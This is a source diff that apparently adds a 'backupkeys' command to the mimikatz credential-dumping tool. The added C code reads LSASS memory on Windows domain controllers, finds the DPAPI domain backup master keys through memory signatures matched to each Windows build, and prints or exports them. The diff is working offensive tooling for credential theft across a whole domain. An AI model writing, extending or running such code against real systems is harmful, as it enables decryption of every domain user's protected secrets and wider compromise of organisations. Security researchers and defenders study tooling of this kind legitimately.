@@ -20,7 +20,8 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_pth,		L"pth",				L"Pass-the-hash"},
 	{kuhl_m_sekurlsa_krbtgt,	L"krbtgt",			L"krbtgt!"},
 #ifdef _M_X64
-	{kuhl_m_sekurlsa_trust,		L"trust",			L"trust!"},
+	{kuhl_m_sekurlsa_trust,		L"trust",			L"Antisocial"},
+	{kuhl_m_sekurlsa_bkeys,		L"backupkeys",		L"Preferred Backup Master keys"},
 #endif
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
 	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
@@ -432,7 +433,7 @@ NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 	{
 		if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
 		{
-			if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, SecDataReferences, ARRAYSIZE(SecDataReferences), &aLsass.address, NULL, &l))
+			if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, SecDataReferences, ARRAYSIZE(SecDataReferences), &aLsass.address, NULL, NULL, &l))
 			{
 				aLsass.address = (PBYTE) aLsass.address + sizeof(PVOID) * l;
 				if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(DUAL_KRBTGT)))
@@ -540,7 +541,7 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 		{
 			if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
 			{
-				if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, DomainListReferences, ARRAYSIZE(DomainListReferences), &aLsass.address, NULL, NULL))
+				if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, DomainListReferences, ARRAYSIZE(DomainListReferences), &aLsass.address, NULL, NULL, NULL))
 				{
 					if(kull_m_memory_copy(&data, &aLsass, sizeof(PVOID)))
 					{
@@ -627,6 +628,88 @@ void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
 		}
 		LocalFree(info->FullDomainName.Buffer);
 	}
+}
+
+void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, BOOL isExport)
+{
+	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass->hLsassMem}, aData = {NULL, &hBuffer};
+	GUID guid;
+	DWORD cb;
+	PVOID pGuid, pKeyLen, pKeyBuffer;
+
+	if(kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, generics, cbGenerics, &pGuid, &pKeyLen, &pKeyBuffer, NULL))
+	{
+		if(aLsass.address = pGuid)
+		{
+			aData.address = &guid;
+			if(kull_m_memory_copy(&aData, &aLsass, sizeof(GUID)))
+			{
+				kull_m_string_displayGUID(&guid); kprintf(L"\n");
+				if(aLsass.address = pKeyLen)
+				{
+					aData.address = &cb;
+					if(kull_m_memory_copy(&aData, &aLsass, sizeof(DWORD)))
+					{
+						if(cb && (aLsass.address = pKeyBuffer))
+						{
+							aData.address = &aLsass.address;
+							if(kull_m_memory_copy(&aData, &aLsass, sizeof(PVOID)))
+							{
+								if(aData.address = LocalAlloc(LPTR, cb))
+								{
+									if(kull_m_memory_copy(&aData, &aLsass, cb))
+									{
+										kuhl_m_lsadump_analyzeKey(&guid, (PKIWI_BACKUP_KEY) aData.address, cb, isExport);
+									}
+									LocalFree(aData.address);
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+BYTE PTRN_WALL_BackupKey[]			= {0xb9, 0x02, 0x00, 0x00, 0x00, 0x89, 0x05};
+KULL_M_PATCH_GENERIC BackupKeyReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  37,  44}},
+	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  40,  47}},
+	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  33,  40}},
+	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  30,  37}},
+};
+BYTE PTRN_W2K3_BackupKeyCompat[]	= {0x45, 0x33, 0xc9, 0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xe8};
+BYTE PTRN_W2K8_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd7, 0xe8};
+BYTE PTRN_W2K8R2_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd6, 0xe8};
+BYTE PTRN_W2K12_BackupKeyCompat[]	= {0x85, 0xc0, 0x74, 0x21, 0x4c, 0x8d, 0x05};
+BYTE PTRN_W2K12R2_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0xe8};
+KULL_M_PATCH_GENERIC BackupKeyReferencesCompat[] = {
+	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_W2K3_BackupKeyCompat),		PTRN_W2K3_BackupKeyCompat},		{0, NULL}, {-4, -18, -11}},
+	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_W2K8_BackupKeyCompat),		PTRN_W2K8_BackupKeyCompat},		{0, NULL}, {-4,  26,  33}},
+	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_BackupKeyCompat),	PTRN_W2K8R2_BackupKeyCompat},	{0, NULL}, {-4,  20,  27}},
+	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_W2K12_BackupKeyCompat),	PTRN_W2K12_BackupKeyCompat},	{0, NULL}, {21,   7,  14}},
+	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_W2K12R2_BackupKeyCompat),	PTRN_W2K12R2_BackupKeyCompat},	{0, NULL}, {-4,  17,  24}},
+};
+NTSTATUS kuhl_m_sekurlsa_bkeys(int argc, wchar_t * argv[])
+{
+	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
+	PKUHL_M_SEKURLSA_LIB pLib;
+	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
+
+	if(NT_SUCCESS(status))
+	{
+		pLib = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package.Module : &kuhl_m_sekurlsa_dpapi_lsa_package.Module;
+		if(pLib->isPresent)
+		{
+			kprintf(L"\nCurrent prefered key:       ");
+			kuhl_m_sekurlsa_bkey(&cLsass, pLib, BackupKeyReferences, ARRAYSIZE(BackupKeyReferences), export);
+			kprintf(L"\nCompatibility prefered key: ");
+			kuhl_m_sekurlsa_bkey(&cLsass, pLib, BackupKeyReferencesCompat, ARRAYSIZE(BackupKeyReferencesCompat), export);
+		}
+	}
+	return status;
 }
 #endif
 
